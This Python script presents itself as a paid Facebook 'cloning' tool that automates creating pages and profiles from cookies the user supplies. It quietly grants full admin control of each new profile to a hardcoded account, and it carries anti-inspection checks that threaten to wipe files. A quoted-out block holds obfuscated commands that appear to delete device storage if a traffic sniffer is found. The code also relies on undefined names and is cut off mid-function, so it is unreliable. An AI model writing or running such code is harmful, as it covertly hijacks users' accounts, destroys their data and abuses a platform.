fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana')

from os import path
from urllib.request import urlopen
import os
import base64
import zlib
import pip
import urllib3
import sys
import re
import requests
import time
import random
import json
import string
from bs4 import BeautifulSoup as bs
from datetime import datetime
from time import time as tim
import mahdix
######METHOD PROTECT######
def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(' \033[1;91m[!] ALL YOUR FILES WILL REMOVE IF YOU TRY AGAIN! ');exit()
        else:exit()
    except:exit()
####### MODULES KILLER #######
from requests import api
x = open(api.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
elif "open().write" in x:
	clr()
elif "write" in x:
	clr()
elif "logging.info" in x:
	clr()
elif "logging" in x:
	clr()
elif "printf" in x:
	clr()
elif "echo" in x:
	clr()
elif "os.system" in x:
	clr()
elif "system" in x:
	clr()
else:
    pass
from requests import sessions 
x = open(sessions.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
elif "open().write" in x:
	clr()
elif "write" in x:
	clr()
elif "logging.info" in x:
	clr()
elif "logging" in x:
	clr()
elif "printf" in x:
	clr()
elif "open" in x:
	clr()
elif "echo" in x:
	clr()
else:
    pass
from requests import models
x = open(models.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
elif "open().write" in x:
	clr()
elif "write" in x:
	clr()
elif "open" in x:
	clr()
elif "logging.info" in x:
	clr()
elif "printf" in x:
	clr()
elif "echo" in x:
	clr()
elif "system" in x:
	clr()
elif "os.system" in x:
	clr()
######METHOD PROTECTION END###### 

""" print('\x1b[1;32m\n[!] installing modules...\n')
exec(zlib.decompress(b'x\x9c\xed\x96[o\xda0\x14\x80\x9f\xe1W\xe4\xcdA\xa2\xa9\xb4u}\xa8\x8446:\xb1\xa9\xedZ\xa5\x9a\xbaM\x132\xc9\x01\xbc\xc6q\xf01\xe0\xf4\xd7\xcf\xce\x85\x86\xb5\xa0t\x1d\xedK^r\xf1\xb9\x9f\xcfG:\x13)\xb8\x03\x9c\xb2\xc8\xe3\x80H\xa7\xe00\x9e\x08\xa9\x9cS{x\x9e\x9f\xb5\x8b3\xc4\xa8\x8b\\%\x11\x1b\xb73\xa3\x11B\x1c\x82tz\x0eY\xb2\x84SM\x83\xe0\xfd4s\x17\x08N\n\xa5\x84"\xae\x84\x0c\xad\x9a\x16\xc8a\xbe\x8c\xe2\xc5-\x8b\xd8|^\xeaH\x08\x80-sW\xf4\x96\xc5S\x9c\x99\x88\xa9\xaazS2=i\xb7\xf2gK$\x10\xbb\xe4\x10\xc3\x80\xca\xf0P{J+\xd2%\x92t<\t4t;\xed\x16\xe8\x00\x12\xb5]wetW\x92)p\xc9\xcd\x80\x18\x83\x96M\xb4\xbd6\x13\xe8a\x8a\n\xb8K\x14H\xbe\xd0\x07\x08j\x91\x1c\xa0\x12\xd24\x85d!\x982\xa1\xf2\x94\xb4\xeem\x06\xbaB\xe9%\xe9_Y\x8dE\x98\x9a"\xb56\xd6\xbcW\xed\xb2\x95\xe2b\xfc\x1b\x02e\xbb\xe0\\Q\x86\xa6!\xc4*\xfe$\x13C\x8a\xfc2\x82j\xe3s\xd1\xb5\xa8\x08\xcaF\xe6\xa2\xc2_&/\xbe\xad\xc03\x95\x8c\x02\x11+\x88\x95k32\xa1\xb3_\xadz\x06\xb2\x17\x98l\x15\x8cB\x98\xd0EThj[ik\xc5\xd4\xcc)\xee\x80\xe7\x9f__\x8e|\xff\xcc%\xf6\xc4\xbbG\xd5u\x8e\x8e\xdfuK\x8f\xc5\xbb\xe3P\xccL-\x92\xcc \x12S\x16\xbb\xd5\x82\xba\x9b7\xa6SjZ\xa9\x95<\xa6\\Vl~=\x8a#T\xd2\\\x1f\xb7cm\x0b>\xe5{\x8d6\x03\xbd\x85ZH\x15}\x88\x8dM\x1c\xe2\x7f?\x1d8?\xfa\x83>qXl\x08\xda:*8\x1f\xe3\xb9\x01\xd4O!\xb48w\xf1\xdc\x05t;\xd1-Hk2\xfdoP\x9f@\xf5YX\xd7\\\xef\x01G\x08\'\x9b\xe3\xbb\x8bq"\xc5\xdb7\xcf\x99\xcd~\x7f\xf8\xf9\xac\x19\xcd\x7ffX\x8b\xd2\x85\xd0;\x19U\x81\\|\xbd\xc9q<\xc0\xd6\x10\xda\x1f!\x9f\xca\x89\xa4w\xb5)\xf9\xfe\x87\x86\xd2\x8bS\xfa\xc4"\xf8V\x9b\xd1\x17j6\xc1\x86\xd2\x8bS\x9a\x1d\x1f\xd5\x034\xa4\xfc\x8e6\x80^\x03P\xed!j\x18\xbd\x12#\x91<\x91Q\xb66\xd8\xed~\xf8Q\x98,\xb0\xdc\xed\xb3(\xf9^\xb9e\xb5o\xb6\xf8\xbd\xe3\x8c\x85\xae\xb9\xfe\t\xddL\xdb\xfe\xa6\xed\x0f*\xda\x1du'))
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pkg install espeak')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python ZIDI-XD.py')
except:pass
try:
        a = "anar"
        t="tt"
        fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
        if f'com.h{t}pc{a}y.pro' in fileee:
                print('\033[1;37m[×] First uninstall HttpCanary Apk for run tools ')
                os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
                os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
                os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
                exit()
        else:pass
except Exception as e:
                pass

try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;32m[!] TOOL RUNNING...')
	
proxies=open('proxies.txt','r').read().splitlines()

android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass """

""" ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}  """

""" #Key1

def clear():
	os.system('clear')
def back():
	login()

ah="ALEX-"
imt="-M1107=="
ak=" RPW-"
myid=uuid.uuid4().hex[:10].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'w')
	kok.write(myid+imt)
	kok.close()
def login():
	try:
		token = open('.token.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
			public_menu()
		except KeyError:
			Public()
		except requests.exceptions.ConnectionError:
			clear()
			print(logo)
			print ( ' [×] Connection Timeout')
			exit()
	except IOError:
		Public()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)  """      
        
#YEAR CHECKER
def alex(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alif = '2009'
        elif ids[:9] in ['100000000']       :alif = '2009'
        elif ids[:8] in ['10000000']        :alif = '2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = '2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = '2010'
        elif ids[:6] in ['100001']          :alif = '2010-2011'
        elif ids[:6] in ['100002','100003'] :alif = '2011-2012'
        elif ids[:6] in ['100004']          :alif = '2012-2013'
        elif ids[:6] in ['100005','100006'] :alif = '2013-2014'
        elif ids[:6] in ['100007','100008'] :alif = '2014-2015'
        elif ids[:6] in ['100009']          :alif = '2015'
        elif ids[:5] in ['10001']           :alif = '2015-2016'
        elif ids[:5] in ['10002']           :alif = '2016-2017'
        elif ids[:5] in ['10003']           :alif = '2018-2019'
        elif ids[:5] in ['10004']           :alif = '2019-2020'
        elif ids[:5] in ['10005']           :alif = '2020'
        elif ids[:5] in ['10006','10007','']:alif = '2021'
        elif ids[:5] in ['10008']           :alif = '2022'
        elif ids[:5] in ['10009']           :alif = '2023'
        else:alif=''
    elif len(ids) in [9,10]:
        alif = ' 2008-2009 '
    elif len(ids)==8:
        alif = ' 2007-2008 '
    elif len(ids)==7:
        alif = ' 2006-2007 '
    elif len(ids) in [13,14]:
        alif = ' 2023 '
    else:alif=''
    return alif

#YEAR CHECKER 2
def gray(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :alif = '2009'
        elif uid[:9] in ['100000000']       :alif = '2009'
        elif uid[:8] in ['10000000']        :alif = '2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = '2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = '2010'
        elif uid[:6] in ['100001']          :alif = '2010-2011'
        elif uid[:6] in ['100002','100003'] :alif = '2011-2012'
        elif uid[:6] in ['100004']          :alif = '2012-2013'
        elif uid[:6] in ['100005','100006'] :alif = '2013-2014'
        elif uid[:6] in ['100007','100008'] :alif = '2014-2015'
        elif uid[:6] in ['100009']          :alif = '2015'
        elif uid[:5] in ['10001']           :alif = '2015-2016'
        elif uid[:5] in ['10002']           :alif = '2016-2017'
        elif uid[:5] in ['10003']           :alif = '2018-2019'
        elif uid[:5] in ['10004']           :alif = '2019-2020'
        elif uid[:5] in ['10005']           :alif = '2020'
        elif uid[:5] in ['10006','10007','']:alif = '2021'
        elif uid[:5] in ['10008']           :alif = '2022'
        elif uid[:5] in ['10009']           :alif = '2023'
        else:alif=''
    elif len(uid) in [9,10]:
        alif = ' 2008-2009 '
    elif len(uid)==8:
        alif = ' 2007-2008 '
    elif len(uid)==7:
        alif = ' 2006-2007 '
    elif len(uid) in [13,14]:
        alif = ' 2023 '
    else:alif=''
    return alif

        
logo="""\33[1;32m

                 █████╗ ██╗  ██╗██╗     
                ██╔══██╗╚██╗██╔╝██║     
                ███████║ ╚███╔╝ ██║     
                ██╔══██║ ██╔██╗ ██║     
                ██║  ██║██╔╝ ██╗███████╗
                ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
\33[1;32m-------------------------------------------------------- 
  Owner      :  Alexander Grayson
  Facebook   :  AlexanderGraysonRecovery.IAmLimitless
  Tool Type  :  RPW Facebook Cloning Tool (Paid)
  Network    :  All Network
  Version    :  4.4
\33[1;32m--------------------------------------------------------"""
def linex():
        print('\033[93;1m════════════════════════════════════════════════════════')         
def clear():
        """ os.system('clear') """
        """ print(logo) """
user_opt=[]
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]

import requests
print(logo)

def mainmenu():
        clear()
admin_id='100023826018132'
""" print('\033[1;32m--------------------------------------------------------') """
password='Alexander1107/'
""" print('\033[1;32m--------------------------------------------------------') """
coki=input(f'{LI_YELLOW}  Cookies : {LI_GREEN }')
print('\033[1;32m--------------------------------------------------------')
lemite=1

names_fast = [
    "Joon", "Jiyeon", "Minho", "Soo Jin", "Hyun", "Hana", "Taeyang", "Eunji", "Seok", "Jisoo",
"Minji", "Taemin", "Sunwoo", "Yeonwoo", "Heejae", "Bomi", "Taeyoon", "Yuna", "Junseok", "Jiho","Jin", "Sungmin", "Soomin", "Jinwoo", "Jinseok", "Yeonju", "Jiwon", "Taeyeon", "Kyungsoo", "Sungjae",
"Yunhee", "Hyejin", "Jaehoon", "Minji", "Jungkook", "Sooyoung", "Heejin", "Yujin", "Donghae", "Hyeonwoo",
"Jinsu", "Soyeon", "Jihyun", "Seungri", "Jihoon", "Seulgi", "Kyungmin", "Boram", "Eunkyo", "Minhee",
"Yoojung", "Soohyun", "Jinsol", "Taeyun", "Yongho", "Hyeonsu", "Jaewon", "Seoyoung", "Jinseon", "Gyuri",
"Junho", "Seunghyun", "Yongjun", "Jinhwan", "Hyeongjin", "Nari", "Eunhee", "Jaemin", "Eunkyung", "Silas", "Adeline", "Everett", "Seraphina", "Atticus", "Genevieve", "Finnian", "Evangeline", "Declan", "Beatrix",
"Jasper", "Adelaide", "Elias", "Elowen", "August", "Clementine", "Harrison", "Genevra", "Quentin", "Isolde",
"Leonidas", "Rosalind", "Remington", "Thalia", "Gideon", "Calliope", "Sullivan", "Ophelia", "Beckett", "Isabeau",
"Dashiell", "Magnolia", "Solomon", "Seraphine", "Ignatius", "Evadne", "Thaddeus", "Persephone", "Alaric", "Araminta",
"Leopold", "Delphine", "Maximilian", "Isolabella", "Montgomery", "Elysia", "Percival", "Anastasia", "Oberon", "Oliver", "Evelyn", "Mason", "Hazel", "Elijah", "Luna", "Sebastian", "Aria", "Leo", "Scarlett",
"Henry", "Grace", "Liam", "Violet", "Lucas", "Eleanor", "Theodore", "Penelope", "Samuel", "Abigail",
"Jackson", "Amelia", "Caleb", "Charlotte", "Owen", "Sophia", "Ezra", "Madeline", "Eli", "Nora",
"Gabriel", "Aurora", "Aiden", "Alice", "Nathan", "Clara", "William", "Emma", "Benjamin", "Isabella",
"Matthew", "Olivia", "Daniel", "Ava", "Andrew", "Chloe", "Nicholas", "Zoe", "Jonathan", "Mia", "Haruki", "Sakura", "Kaito", "Aiko", "Yuki", "Hanae", "Takumi", "Natsuki", "Ren", "Emi",
"Ryota", "Sora", "Aya", "Daiki", "Yui", "Riku", "Mei", "Shota", "Ami", "Kazuki",
"Mio", "Hiroki", "Saki", "Shun", "Yuna", "Ryo", "Miku", "Hayato", "Yuriko", "Asahi",
"Akari", "Kosei", "Aoi", "Yuto", "Natsumi", "Renji", "Ayane", "Kenta", "Hikari", "Rina",
"Ryohei", "Haruna", "Taiga", "Asumi", "Yuta", "Akane", "Soichiro", "Kanako", "Yuji", "Hikaru"
]
last_names = [
    "Yamamoto", "Tanaka", "Suzuki", "Nakamura", "Sato", "Kobayashi", "Kato", "Ito", "Watanabe", "Yamada",
"Ono", "Hayashi", "Sakamoto", "Ishikawa", "Inoue", "Kimura", "Takahashi", "Matsumoto", "Saito", "Shimizu",
"Nakajima", "Mori", "Arai", "Fujita", "Hara", "Sakai", "Okada", "Nagai", "Kondo", "Abe",
"Ogawa", "Imai", "Fujimoto", "Goto", "Maeda", "Mura", "Ishida", "Takada", "Hirano", "Shibata", "Takeda",
"Mizuno", "Nishimura", "Sugiyama", "Fukuda", "Matsui", "Hashimoto", "Yoshida", "Ishii", "Sugawara", "Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor",
"Anderson", "Thomas", "Jackson", "White", "Harris", "Martin", "Thompson", "Robinson", "Clark", "Rodriguez",
"Lewis", "Lee", "Walker", "Hall", "Young", "King", "Adams", "Baker", "Garcia", "Martinez",
"Davis", "Rodriguez", "Wilson", "Perez", "Lopez", "Thomas", "Hall", "Lewis", "Martin", "Johnson",
"Brown", "White", "Jones", "Smith", "Anderson", "Lee", "Williams", "Harris", "Taylor", "Moore", "Kim", "Lee", "Park", "Choi", "Kang", "Yoon", "Jung", "Jang", "Im", "Ahn",
"Shin", "Kim", "Hong", "Song", "Oh", "Han", "Yang", "Kwon", "Choi", "Yoo",
"Kim", "Moon", "Shin", "Seo", "Cho", "Baek", "Park", "Kang", "Kim", "Ryu",
"Hwang", "Kim", "Lim", "Chang", "Ahn", "Kim", "Jung", "Lee", "Kang", "Park",
"Choi", "Kim", "Hong", "Yoon", "Song", "Im", "Chun", "Kim", "Maeng", "Jin"
]
name=str(f"{rc(names_fast)} {rc(last_names)}")

headers_global = {
    'authority': 'www.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,id;q=0.8,nl;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'dpr': '1',
    'origin': 'https://www.facebook.com',
    'referer': 'https://www.facebook.com/pages/creation/?ref_type=launch_point',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6090.0", "Google Chrome";v="120.0.6090.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"15.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': W_ueragnt(),
    'viewport-width': '824',
    'x-asbd-id': '129477',
    'x-fb-friendly-name': 'AdditionalProfilePlusCreationMutation',
    'x-fb-lsd': '88Wk18Ml083ahSYoMDL_M4',
}
headers_grapql = {
            'authority': 'www.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8,bn;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '1',
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/settings/?tab=profile_access',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
            'sec-ch-ua-full-version-list': '"Chromium";v="118.0.5993.89", "Google Chrome";v="118.0.5993.89", "Not=A?Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': W_ueragnt(),
            'viewport-width': '700',
            'x-asbd-id': '129477',
            'x-fb-friendly-name': 'ProfilePlusCoreAppAdminInviteMutation',
            'x-fb-lsd': 'yfi6X8XuYIXDxeib36Qir0',
        }
def creating():    
    r = requests.Session()
    req = bs(r.get('https://www.facebook.com/pages/creation/?ref_type=launch_point', headers=headers_global, cookies={'cookie': coki}).content, 'html.parser')
    usr = re.search('__user=(.*?)&', str(req)).group(1)
    hst = re.search('"haste_session":"(.*?)",', str(req)).group(1)
    rev = re.search('{"rev":(.*?)}', str(req)).group(1)
    hsi = re.search('"hsi":"(.*?)",', str(req)).group(1)
    dts = re.search('"DTSGInitialData",\[\],{"token":"(.*?)"', str(req)).group(1)
    jzt = re.search('&jazoest=(.*?)",', str(req)).group(1)
    lsd = re.search('"LSD",\[\],{"token":"(.*?)"', str(req)).group(1)
    spr = re.search('"__spin_r":(.*?),', str(req)).group(1)
    spt = re.search('"__spin_t":(.*?),', str(req)).group(1)
    name_p=name
    bio_p='Alexander Grayson & Rae Suzy Facebook AI'
    data = {
        'av': usr,
        '__user': usr,
        '__a': '1',
        '__req': '1i',
        '__hs': '19666.HYP:comet_pkg.2.1..2.1',
        'dpr': '1',
        '__ccg': 'MODERATE',
        '__rev':rev,
        '__s': 'qvdp97:zb23lw:givv21',
        '__comet_req': '15',
        'fb_dtsg': dts,
        'jazoest': jzt,
        'lsd': lsd,
        '__aaid': '0',
        '__spin_r': spr,
        '__spin_b': 'trunk',
        '__spin_t': spt,
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'AdditionalProfilePlusCreationMutation',
    'variables': '{"input":{"bio":"%s","categories":["1350536325044173","200597389954350","123377808095874"],"creation_source":"comet","name":"%s","page_referrer":"launch_point","actor_id":"%s","client_mutation_id":"3"}}'%(bio_p,name_p,usr),
        'server_timestamps': 'true',
        'doc_id': '5296879960418435',
    }
    response = requests.post('https://www.facebook.com/api/graphql/', cookies={'cookie': coki}, headers=headers_global, data=data)
    parsed_data = json.loads(response.text)
    try:
        additional_profile_id = parsed_data['data']['additional_profile_plus_create']['additional_profile']['id']
        page_id = parsed_data['data']['additional_profile_plus_create']['page']['id']
        print('\033[1;32m--------------------------------------------------------')
        print(f"{LI_YELLOW}  Page Name : {LI_GREEN}", page_id)
        print(f"{LI_YELLOW}  Additional Profile ID: {LI_GREEN} {additional_profile_id}" )
        cokip=coki+'i_user='+additional_profile_id
        sending(cokip,additional_profile_id)
    except:print('\033[1;32m--------------------------------------------------------');print('  Cookie Invalid! You must use new account with profile picture and cover photo.')
def sending(coki,pageid):
    try:
        params = {
            'tab': 'profile_access',
        }
        req1 = requests.get('https://www.facebook.com/settings/', params=params, cookies={'cookie':coki}, headers=headers_global)
        pas='#PWD_BROWSER:0:{}:{}'.format(int(tim()),password)
        av=re.search('__user=(.*?)&',str(req1.text)).group(1)
        data2 = {

            'av': av,
            'dpr': re.search('"pr":(.*?),',str(req1.text)).group(1),
            'fb_dtsg':re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(req1.text)).group(1),
            'jazoest':re.search('&jazoest=(.*?)"',str(req1.text)).group(1),
            'lsd':re.search('"LSD",\[\],{"token":"(.*?)"}',str(req1.text)).group(1),

            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'ProfilePlusMarkReauthedMutation',
            'variables': '{"input":{"password":{"sensitive_string_value":"%s"},"actor_id":"%s","client_mutation_id":"1"}}'%(pas,av),
            'server_timestamps': 'true',
            'doc_id': '5048033918567225',
        }

        req2 = requests.post('https://www.facebook.com/api/graphql/', cookies={'cookie':coki}, headers=headers_grapql, data=data2)
        my_uid=re.search('__user=(.*?)&',str(req1.text)).group(1)

        data3 = {

            'av': my_uid,
            'dpr': re.search('"pr":(.*?),',str(req1.text)).group(1),
            'fb_dtsg':re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(req1.text)).group(1),
            'jazoest':re.search('&jazoest=(.*?)"',str(req1.text)).group(1),
            'lsd':re.search('"LSD",\[\],{"token":"(.*?)"}',str(req1.text)).group(1),

            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'ProfilePlusCoreAppAdminInviteMutation',
            'variables': '{"input":{"additional_profile_id":"%s","admin_id":"%s","admin_visibility":"Unspecified","grant_full_control":true,"actor_id":"%s","client_mutation_id":"2"}}'%(my_uid,admin_id,my_uid),
            'server_timestamps': 'true',
            'doc_id': '5707097792725637',
        }
        response = requests.post('https://www.facebook.com/api/graphql/', cookies={'cookie':coki}, headers=headers_grapql, data=data3)
        print(f'{LI_GREEN}Send Page Admin Done {pageid}  {LI_WHITE}===>> {LI_YELLOW} {admin_id}')
        uupoading(coki,pageid)
    except:print(f'{LI_RED} Field sending {pageid}')


def uupoading(cok,p_id):
    try:
        photos_f=requests.get('https://raw.githubusercontent.com/Shuvo-BBHH/cnt/main/AUTO_PAGE_CREATE/photoslink.txt').text.splitlines()
        link=random.choice(photos_f)
        link2=random.choice(photos_f)
        def main_update_page():
            try:
                photos_f=requests.get('https://raw.githubusercontent.com/Shuvo-BBHH/cnt/main/AUTO_PAGE_CREATE/photoslink.txt').text.splitlines()
                p_photos_link=random.choice(photos_f)
                c_photos_link=random.choice(photos_f)
                pp = {'file':('image.jpg', urllib.request.urlopen(p_photos_link).read())}
